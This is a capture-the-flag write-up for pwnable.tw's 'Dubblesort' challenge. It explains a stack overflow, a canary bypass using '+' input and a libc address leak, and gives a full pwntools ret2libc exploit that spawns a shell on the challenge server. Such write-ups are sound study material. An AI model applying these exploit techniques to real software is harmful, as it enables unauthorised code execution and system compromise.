# Pwnable.tw - Dubblesort

* Website : Pwnable.tw
* Challenge : Dubblesort
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x00
If you cannot open the program with **LD_PRELOAD**, try to change your **ld version.** **(glibc version)**

If you don't have correspond glibc version, try to use this: [skysider/pwndocker](https://github.com/skysider/pwndocker)

First:
```
strings ./libc_32.so.6 | grep 2.2
```

I used glibc2.23 for this challenge.

And then:
```python
r = process(['/glibc/2.23/32/lib/ld-2.23.so','./dubblesort'], env={'LD_PRELOAD':'./libc_32.so.6'})
```

Now you can use gdb to calculate the correct offset ! :+1: 

## 0x01
The first thing we have to do is **checksec** :

![](https://i.imgur.com/HgbSyCQ.png)

Okay, it looks like a hard challenge.

Let's use **IDA Pro** to decompile the binary :
```c
int v3_sort_num;
int *num_array_ptr;
unsigned int count;
unsigned int v6_count;
size_t nbytes_num;
int reslut;
unsigned int sort_num;
int num_array[8]; //this could lead to buffer overflow
char name;
unsigned int canary;

canary = __readgsdword(0x14u);
sub_8B5();
__printf_chk(1, (int)"What your name:");
read(0, &name, 0x40u);
__printf_chk(1, (int)"Hello %s,How many numbers do you what to sort :");
__isoc99_scanf("%u", &sort_num);
if( sort_num )
{
    num_array_ptr = num_array;
    count = 0;
    do
    {
        __printf_chk(1, (int)"Enter the %d number : ");
        fflush(stdout);
        __isoc99_scanf("%u", num_array_ptr);
        ++count;
        v3_sort_num = sort_num;
        ++num_array_ptr;
    }
    while ( sort_num > count );
}
sort_func((unsigned int *)num_array, v3_sort_num);
puts("Result :");
if( sort_num )
{
    v6_count = 0;
    do
    {
        nbytes_num = num_array[v6_count];
        __printf_chk(1, (int)"%u ");
        ++v6_count;
    }
    while( sort_num > v6_count );
}
result = 0;
if ( __readgsdword(0x14u) != canary )
    sub_BA0();
return result;
```
We notice that num_array only store 8 numbers, while we can input more than 8 numbers to **sort_num**, and this leads to the buffer overflow.

Moreover, when I input unpredictable characters to the program, the program shows below:

![](https://i.imgur.com/U6CRSQb.png)

It seems like that we have a lot of fun things could do. :grin:

Look back to the IDA, this is a program which sorts our input value, however, it doesn't check the margin and the input value.

## 0x02
As we thought, we can input **'+'** or **'-'** to bypass the canary, and also we can modify the return address of main.

We don't have enough gadgets to do **ROP**, but we can calculate the **function_offset_to_libc_base** and then return to libc.

But how can we leak the address of libc ?

We notice that there are some ambiguous characters after our input name:

![](https://i.imgur.com/f7qYbLv.png)

It looks like **' redhung \n (ambiguous characters) '**

This could help us to leak the libc address.(You can calculate the offset by **gdb** using **vmmap** and **x/50wx $esp**)

We can use **xxd** to find the /bin/sh in the libc.

> **Notice: When we retrieve the leak address, we must sub 0x0a to get the correct address. 0x0a is \n.**

> **Notice2: num[24] is canary, num[32] is return address, num[33] is saved return address of our modified function, num[34] is /bin/sh.**

## 0x03
Exploit:
```python
from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./dubblesort'], env={'LD_PRELOAD':'./libc_32.so.6'})

r = remote('chall.pwnable.tw',10101)

ret = 33

canary = 25

libc_system_offset = 0x3a940

libc_base_offset = 0x1b0000

libc_binsh_offset = 0x158e8b

r.sendline('a'*24)

leak = u32(r.recvuntil(',').strip(',')[46:50])

leak = leak - 0x0a

print(hex(leak))

libc_base = leak - libc_base_offset

libc_system = int(libc_base + libc_system_offset)

libc_binsh = int(libc_base + libc_binsh_offset)

r.sendline('35')

for i in range(24):
    r.sendline('1')

r.sendline('+')

num = -294967295

for i in range(7):
    r.sendline(str(num))
    num = num-1

r.sendline(str(libc_system))

r.sendline(str(libc_system+1))

r.sendline(str(libc_binsh))

r.interactive()
```
